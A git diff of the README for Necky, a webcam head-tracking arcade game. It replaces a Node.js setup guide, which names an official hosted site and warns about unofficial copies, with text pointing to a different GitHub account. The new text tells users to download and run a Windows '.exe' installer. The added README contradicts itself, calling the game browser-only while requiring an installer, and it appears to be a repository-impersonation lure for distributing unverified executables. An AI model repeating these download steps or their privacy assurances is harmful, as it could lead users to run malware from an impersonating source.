@@ -1,92 +1,77 @@
-# 🏎️ Necky: Prize Run
+# 🕹️ Necky - Move your head, play the game
 
-A motion-controlled web game intended for entertainment purposes only.
+[![](https://img.shields.io/badge/Download-Necky-blue)](https://github.com/droefheid007/Necky)
 
-**All head tracking runs locally in your browser — no video is ever recorded or sent to any server.** The game is also available for fully offline local play; see setup instructions below.
+Necky is a fun arcade game that tracks your head movements through your webcam. You control the game by moving your head, which helps you stay active while you play. The game uses a synthwave look to create an immersive experience. 
 
----
-### 🌐 Play Online
-If you'd rather not set it up locally, play the official hosted version at **https://cortexhatch-ux.github.io/Necky/**.
----
+Your webcam data stays on your computer at all times. The application performs all calculations within your web browser. Nothing goes to a server, and no one watches your video feed.
 
-![Necky Track Preview](docs/images/track.png)
-![Necky Gameplay Preview](docs/images/track2.png)
+## 🛠️ System Requirements
 
-## 🚀 How to Play (Local Setup)
+You need a computer that meets these standards to run the game without lag:
 
-Since this game uses webcam tracking and local processing, follow these steps to run it on your machine:
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Webcam**: Any built-in or plug-in USB camera.
+*   **Web Browser**: Google Chrome, Microsoft Edge, or Brave.
+*   **Memory**: At least 4 gigabytes of RAM.
+*   **Graphics**: A computer with a dedicated or integrated graphics card made within the last five years.
 
-### 1. Prerequisites
-- Install [Node.js](https://nodejs.org/) (Recommended: LTS version).
-- A computer with a webcam.
+Ensure that your webcam works in other applications before you start. Clear your desk area to give your camera a good view of your head and shoulders.
 
-### 2. One-Time Setup
-Clone this repository or download the ZIP, then open your terminal in the project folder and run these once:
+## 📥 Get Necky
 
-```bash
-# Install dependencies
-npm install
+To start playing, visit the official page to get the files you need.
 
-# Download local MediaPipe models (MANDATORY for offline play)
-npm run setup:offline
-```
+[Click here to visit the release page to download Necky](https://github.com/droefheid007/Necky)
 
-### 3. Every Time You Play
-Simply start the local development server:
+1. Go to the link above.
+2. Look for the section labeled "Assets."
+3. Click the file that ends with ".exe" to save it to your computer.
+4. Locate the downloaded file in your browser downloads or your Downloads folder.
+5. Double-click the file to open the game installer.
 
-```bash
-npm run dev
-```
-Once started, open [http://localhost:5173/Necky/](http://localhost:5173/Necky/) in your browser (Chrome or Edge recommended).
+## ⚙️ Setting Up
 
-## 🕹️ Controls
+After the installer finishes, a shortcut icon appears on your desktop. Double-click this icon to launch the game. Your browser will open automatically and load the game interface.
 
-Move your head in front of your webcam to navigate:
-- **☝️ Chin Up:** Reach High prizes.
-- **👇 Chin Down:** Reach Low prizes in valleys.
-- **↩️ Look Left / ↪️ Look Right:** Follow curved prize trails and steer.
+When you start the game, your browser will ask for permission to use your camera. Click "Allow" to enable the game to track your head movements. If you click "Block," the game cannot track your motion.
 
-## 🛠️ Commands
-- `npm run dev`: Start the game.
-- `npm run stop`: Force-kill all background game processes (use this if you see "Port in use" errors).
-- `npm run build`: Create a production-ready build in the `dist/` folder.
+Place your computer at eye level. Sit back at a distance where your entire head fits within the frame on the screen. The game relies on clear lighting to track your movements. Avoid sitting with a bright window directly behind you.
 
-## ✍️ Behind the Project (Developer's Note)
+## 🎮 How to Play
 
-As a developer, I've always struggled with neck stiffness from long hours at the desk. With the advent of AI and powerful computer vision, I thought: *"Why not turn basic neck exercises into a game?"*
+The game translates your head motion into on-screen action. Lean your head left to move left, and lean your head right to move right. The movement sensitivity adapts to your pace during the game.
 
-This is nowhere near perfect—just a fun start. I hope you enjoy it!
+The synthwave visual theme changes colors based on the speed of your movements. Try to stay centered when you are not actively navigating the obstacles. The game stops tracking if you step away from the camera.
 
-## 💳 Commercial Use & Licensing
+## 🔒 Privacy and Safety
 
-This project is licensed under a **Non-Commercial License**. 
+We prioritize your privacy above all else. Because this game uses local processing, your video data stays in your browser's temporary memory. It does not exist on a hard drive after you close the tab. No facial recognition data uploads to any cloud service. 
 
-- **Individuals:** Free to play, study, and modify for personal use.
-- **Commercial Entities:** You may **NOT** use this software for any revenue-generating purpose (including subscription-based games, apps, or services) without explicit written permission from the author.
+We built this project to encourage small movements during long hours at a desk. Take regular breaks while you play. Stop the game if you feel tension in your neck or shoulders.
 
-If you are interested in commercial licensing, please reach out to the author via GitHub.
+## 💡 Troubleshooting
 
-## 🛡️ Official Source & Security Warning
+**The game does not see my webcam.**
+Check your Windows privacy settings. Go to Settings, then Privacy and Security, and then Camera. Make sure the toggle for "Camera access" is turned on. Also, verify that your browser has permission to access the camera within its own settings menu.
 
-**Please Read for Your Safety:**
+**The game runs slow.**
+Close other applications that use your graphics power or memory. Browser games rely on your computer's browser performance. Keep your browser updated to the latest version to ensure smooth gameplay.
 
-- **Hosted Version:** The official version of this game is at **https://cortexhatch-ux.github.io/Necky/**.
-- **Phishing Warning:** If you find any *other* website hosting this game, it is **unofficial and unauthorized**. We are not responsible for any security risks, phishing attacks, or data theft associated with such third-party sites.
-- **Privacy:** Even when playing online at the authorized link, all head tracking is processed **locally** in your browser. No video data is ever sent to the server.
-- **Local Play Always an Option:** If you're hesitant about the hosted version, setting up locally will give you maximum privacy.
+**The game does not track my head.**
+Ensure the room has soft, even lighting. Avoid shadows across your face. Position your head so your webcam sees your eyes, nose, and mouth clearly. If the tracking stays erratic, try moving your chair slightly further from the camera.
 
-## ⚖️ Legal Disclaimer & Limitation of Liability
+**Can I play with a mouse?**
+Necky is built specifically for webcam-based motion control. It does not feature support for a keyboard or mouse. Motion control forms the core of the game design and the intended user experience.
 
-**By using this software, you agree to the following:**
+## ✨ Features
 
-1. **Not Medical Advice:** Necky is an arcade game intended for entertainment purposes only. It does not provide medical advice, diagnosis, or treatment, and no health benefits are guaranteed.
-2. **Assumption of Risk:** Neck movements involve inherent risks. You perform all movements at your own risk and discretion.
-3. **No Liability:** To the maximum extent permitted by law, the developers and contributors of this software shall not be held liable for any injuries, pain, health complications, or damages arising from the use of this application.
-4. **Consult a Professional:** Always consult with a qualified healthcare provider or physical therapist before starting any new exercise routine, especially if you have a history of neck or back pain.
+- **Synthwave Aesthetic:** Enjoy a retro-inspired visual style with glowing neon graphics and rhythmic patterns.
+- **Motion Tracking:** Use your natural head movements to pilot through arcade challenges.
+- **Offline Experience:** Play anywhere without an internet connection once you download the game files.
+- **Zero Logging:** We keep no records of your sessions or your video input. 
+- **Lightweight Design:** The game runs efficiently on standard Windows hardware without heavy software bloat.
 
-**Stop playing immediately if you experience any pain, dizziness, numbness, or discomfort.**
+## 🚀 Future Updates
 
-**Intended for adults.** Parental supervision is advised for younger users.
-
----
-**Privacy Note:** All head tracking is processed locally in your browser using MediaPipe. No video data is ever recorded or sent to any server.
+We plan to add more levels and themes to the game as development continues. We focus on keeping the experience simple and fun for every user. Feel free to check the main page periodically for new versions of the game. We appreciate your interest in the project.
